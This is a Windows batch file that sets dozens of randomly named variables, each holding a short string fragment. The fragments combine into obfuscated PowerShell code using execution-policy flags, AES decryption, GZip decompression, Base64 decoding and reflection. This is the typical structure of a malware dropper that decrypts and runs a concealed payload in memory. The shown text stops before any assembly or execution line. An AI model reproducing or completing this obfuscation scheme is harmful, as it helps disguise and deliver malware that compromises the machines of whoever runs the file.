@echo off
set "bsTuIdkhBK=mWEh"
set "UBadPmnCog=pher"
set "vyhUyjSrny=tryP"
set "lzxavBPybU=oint"
set "hktwaXbQpC=HSo."
set "jTcFnmQXkV=F'[-"
set "bqGLiLdmog=bjec"
set "sCvwqAoAxE=Ar ="
set "fQUKiSWVql=m.IO"
set "gzylAvTfmX= [Sy"
set "zwVHqoJhxy=).Sp"
set "pRUVQETUPF=v4Ir"
set "xriyLiGfJU=bstr"
set "UmTIOtgtKo=e]::"
set "sgxwzzyjOv=+hAO"
set "WWvxfMSJHW=SNAr"
set "HiZJapucji= = ["
set "AjIgMvKOHD=jtdK"
set "dekSnUtOhq=6esa"
set "rhsRnHsPck=m(, "
set "vglYEhlTAT=null"
set "JMnhgOTbXC=gnir"
set "mQXbOSYsEf=ion."
set "HnCBHQxKdf=('l0"
set "pOjOcKqfXc=raph"
set "JsLXNgqFrx=SryG"
set "zPrhSnPsiJ=em.C"
set "NdTGlIbiWa=[]] "
set "ZofckaruBM=vScY"
set "LLJQyAehnj=.Cop"
set "vxVCdrFRyr=oL'["
set "RnZJcwJdtR=$nii"
set "YQGMxjqieB=yTo("
set "AYWEmgvIwa=-4] "
set "SXWAcerNMt=ZYYc"
set "imxhnPAnig=flec"
set "vtXBtTxYOl=rtS4"
set "PlVBAfOjvC=sGUc"
set "RbjgCCYxzc=OyzA"
set "IPKuQcoVwy=]::C"
set "XltDTrJXMp=ose("
set "rlXNkxPexq=kSNA"
set "jEZhcFzHTA=hy.A"
set "cTabmFrvwC=TllA"
set "ygnpylvyFm=r = "
set "urjGspamnk= if "
set "zHsCJkTsag=.Cre"
set "DbwSwzqNXS=tem."
set "xoulkQKEpW=[Sys"
set "rJutnImuAR=Conv"
set "RczrJcEGBj=jtdK"
set "MJxCAhNNNK=form"
set "fQyuBZqaAK=DZCx"
set "vdCQRRRRRN=:('g"
set "QdNvnDYRqr=();$"
set "khsSqfZKxD=Sh.T"
set "KpILVorZHm=nage"
set "ChCLzWXSnj=comp"
set "flbHUWMuoJ=in $"
set "UWlaCWkbhp=;$ni"
set "nnypFAKPIk=join"
set "RskvfHMnnU=..-1"
set "evDmMEnXCT=n ''"
set "xgkWBLwTSh=Obje"
set "pOYMwrkEeB=ring"
set "VPfvRFitAl=mWEh"
set "QTjqezTLBs=$kSN"
set "mXslBQRWmw=ypto"
set "gqRcbeBWNB=Cxt."
set "VPLKBbIAOk==');"
set "YOVDCDuAMo=vM ="
set "xuzfllJwgO=y]::"
set "OEzEzAVgbO=ose("
set "FOlMIrWclR=;$al"
set "uOsYGeTjsH=.GZi"
set "AqmXJqoOfc=se()"
set "FOzDObSNUR=]::("
set "gKxxCUYTBZ=g = "
set "yZeSYcXJHk=)) {"
set "tlqFtDEToK=k; }"
set "ClVVfBKQsi=ck($"
set "xmGqmpKpQE=Bmor"
set "TVpsAAzAPE=ct S"
set "ZkhrtMTuUz=m.Re"
set "TzqYBNaLTj=ew-O"
set "TsQtHXTygd=);$Y"
set "jyNDZvKfVv=();$"
set "qxjrgbDePK=ing("
set "GiXrJFEiff=.Com"
set "QeRSIDKUPQ='')("
set "PhRRmKSlqv=lBlo"
set "DTYINtdhpa=1..-"
set "JouShBjsiX=m.IO"
set "YKEqvUZKPP=ress"
set "YZruTBsDfQ=KRjc"
set "OrWQXYbxIf=rofi"
set "CquRsVEPna=Hda "
set "FnheXxghYI=oin "
set "SMkXeitEXJ=$YKR"
set "imLkDKIzSK=0O+g"
set "BwFYdhJZVg=vM);"
set "RgIZyatJsX=Syst"
set "GRYPIRhgDu=n ''"
set "HhRrMqKJjm=ct S"
set "LJZuIQkxMn=Secu"
set "BcUhgOJXFD=($DZ"
set "OtFKYSbARs=..-1"
set "gbNylurEOC=Syst"
set "bfPXpCEjky='dqR"
set "rqtJSiDzNB=ddin"
set "jkNylOXpIT=fore"
set "MNMzlVkDEl=  $d"
set "hWTbegvWVp=-ep "
set "VLegaiczuo=ne);"
set "LuBMGUBPaH=rt]:"
set "terqqcQqZi=Fina"
set "gyJJadannA=] -j"
set "SvXykSkqqa=; };"
set "LDLBAUNxAr= = N"
set "GrhkazuSLw=ionM"
set "aoTkBGZZEL=[-1."
set "HKGMVdBJBd=ewLi"
set "fxewzVcjGc=lit("
set "QaFvNDspAP=1] -"
set "nYyqnPyaEu=le  "
set "NRCGDUiXSo=esMa"
set "CCgvFSMwxb='[-1"
set "WXanIIpFgJ=$Sry"
set "StYytgwAkA=rity"
set "UavJaeQFmN=h.Pa"
set "LTfHYVhnYZ=esFX"
set "WJNWeZzlZy=V = "
set "eAzGHFCUcn=[IO."
set "DgBsBTwgjV=New-"
set "XsgPqVqHPw=ddin"
set "TYPiNHXodc= [Sy"
set "scvPkNWPvP=$kSN"
set "kMsOQRxVLQ=comm"
set "JalqKYVIxJ=.Cry"
set "coIWUGdJqe=($DZ"
set "ghzGeRcfAM=Obje"
set "nrnwRONbNb=t Sy"
set "nUUycaeFsV=raph"
set "NwzRvobnvq=New-"
